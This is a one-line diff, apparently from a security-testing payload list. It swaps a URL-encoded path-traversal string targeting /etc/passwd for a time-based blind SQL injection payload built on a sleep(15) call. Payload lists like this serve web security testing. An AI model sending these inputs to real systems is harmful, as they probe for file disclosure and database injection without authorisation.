@@ -1,1 +1,1 @@
-..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+5550'XOR(555*if(now()=sysdate(),sleep(15),0))XOR'Z
